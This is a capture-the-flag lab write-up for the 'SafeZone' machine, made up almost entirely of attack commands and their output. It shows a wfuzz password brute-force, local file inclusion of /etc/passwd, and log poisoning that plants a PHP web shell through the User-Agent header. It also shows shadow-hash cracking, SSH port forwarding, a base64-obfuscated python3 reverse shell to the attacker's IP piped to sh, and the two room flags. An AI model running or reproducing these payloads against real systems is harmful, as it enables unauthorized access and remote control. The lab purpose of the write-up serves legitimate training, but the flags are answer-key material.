# SafeZone 

> VOiD | Monday 14 March 2022 04:33:18 PM UTC

My IP : 10.8.253.221
Target IP : 10.10.110.16



## PORT 80 [http]
```bash
/note.txt
Message from admin :-

		I can't remember my password always , that's why I have saved it in /home/files/pass.txt file .


http://10.10.110.16/register.php

curl http://10.10.110.16/~files/pass.txt
Admin password hint :-

		admin__admin

				" __ means two numbers are there , this hint is enough I think :) "

wfuzz -c -z file,wd.txt -t1 -s 20 -d "username=admin&password=adminFUZZadmin&submit=Submit" "http://10.10.110.16/index.php"

000000009:   200        46 L     135 W      2428 Ch     "08"                
000000010:   200        46 L     135 W      2428 Ch     "09"                
000000011:   200        46 L     135 W      2428 Ch     "10"                
000000012:   200        46 L     135 W      2428 Ch     "11"                
000000013:   200        46 L     135 W      2428 Ch     "12"                
000000014:   200        46 L     132 W      2430 Ch     "13"                
000000015:   200        46 L     132 W      2430 Ch     "55"    

we will get success at 44

admin : admin44admin
view-source:http://10.10.170.167/detail.php?page=/etc/passwd


view-source:http://10.10.109.189/detail.php?page=/var/log/apache2/access.log

curl http://10.10.109.189/ -A '<?php system($_GET['cmd']); ?>' 
```

## USER [www-data]
```bash
www-data@safezone:/home/files$ cat .something#fake_can\@be\^here 
files:$6$BUr7qnR3$v63gy9xLoNzmUC1dNRF3GWxgexFs7Bdaa2LlqIHPvjuzr6CgKfTij/UVqOcawG/eTxOQ.UralcDBS0imrvVbc.

Proceeding with wordlist:/usr/share/john/password.lst
magic            ( files)   
```

## USER [files]
```bash
User files may run the following commands on safezone:
    (yash) NOPASSWD: /usr/bin/id

port 8000 is open on localhost

ssh -L 8000:127.0.0.1:8000 10.10.109.189
http://localhost:8000/login.html
pentest.php
http://localhost:8000/pentest.php
runns the command and echo it

echo "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjguMjUzLjIyMSIsNDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3N1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKSc" | base64 -d | sh

```

## USER [yash]
```bash
yash@safezone:~$ cat flag.txt 
THM{c296539f3286a899d8b3f6632fd62274}


User yash may run the following commands on safezone:
    (root) NOPASSWD: /usr/bin/python3 /root/bk.py

yash@safezone:/tmp$ cat root.txt 
THM{63a9f0ea7bb98050796b649e85481845}

```